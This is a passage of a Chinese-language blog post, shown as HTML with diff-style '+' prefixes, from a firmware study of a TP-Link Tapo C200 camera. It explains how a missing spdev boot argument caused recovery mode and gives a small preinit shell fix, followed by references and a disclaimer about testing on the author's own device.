+<h3 id="9-4-spdev-缺失导致进入恢复模式"><a href="#9-4-spdev-缺失导致进入恢复模式" class="headerlink" title="9.4 spdev 缺失导致进入恢复模式"></a>9.4 spdev 缺失导致进入恢复模式</h3><p><strong>问题</strong>：不手动设置 bootargs 启动时，WiFi 不工作。即使按住重置按钮 10 秒也无法恢复。<br><strong>原因</strong>：之前的 <code>saveenv</code> 覆盖了出厂 bootargs，新的 bootargs 中缺少 <code>spdev=/dev/mtdblock7</code> 参数。导致 preinit 不挂载 sp_rom，系统进入恢复模式（创建 <code>/tmp/recovery_mode</code>），只运行 mini_main 而非完整的 main。<br><strong>解决</strong>：修改 preinit 中的 <code>mount_sp_rom()</code> 函数，加入 fallback 逻辑：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mount_sp_rom</span></span>() &#123;</span><br><span class="line">    spdev=$(awk <span class="string">&#x27;BEGIN&#123;RS=&quot; &quot;;FS=&quot;=&quot;&#125; $1==&quot;spdev&quot;&#123;print $2&#125;&#x27;</span> &lt; /proc/cmdline)</span><br><span class="line">    [ <span class="string">&quot;<span class="variable">$spdev</span>&quot;</span> = <span class="string">&quot;&quot;</span> ] &amp;&amp; spdev=<span class="string">&quot;/dev/mtdblock7&quot;</span>    <span class="comment"># ← 新增这一行</span></span><br><span class="line">    mount -t squashfs -o relatime <span class="variable">$spdev</span> /sp_rom</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://quentinkaiser.be/security/2025/07/25/rooting-tapo-c200/">Rooting the TP-Link Tapo C200</a></li>
+</ul>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本研究仅用于学术目的，所有测试在自有设备上进行。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cuo-kokomi.github.io/2026/06/21/tapo-c200-root/" data-id="cuidPahOu8iI3nWMCwQLdVGyk" data-title="TP-Link Tapo C200 v5.0 固件安全研究" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/U-Boot/" rel="tag">U-Boot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UART/" rel="tag">UART</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag">固件安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" rel="tag">逆向工程</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Security-Research/">Security Research</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/U-Boot/" rel="tag">U-Boot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UART/" rel="tag">UART</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag">固件安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" rel="tag">逆向工程</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/U-Boot/" style="font-size: 10px;">U-Boot</a> <a href="/tags/UART/" style="font-size: 10px;">UART</a> <a href="/tags/%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;">固件安全</a> <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" style="font-size: 10px;">逆向工程</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/06/21/tapo-c200-root/">TP-Link Tapo C200 v5.0 固件安全研究</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 陈祥锐<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
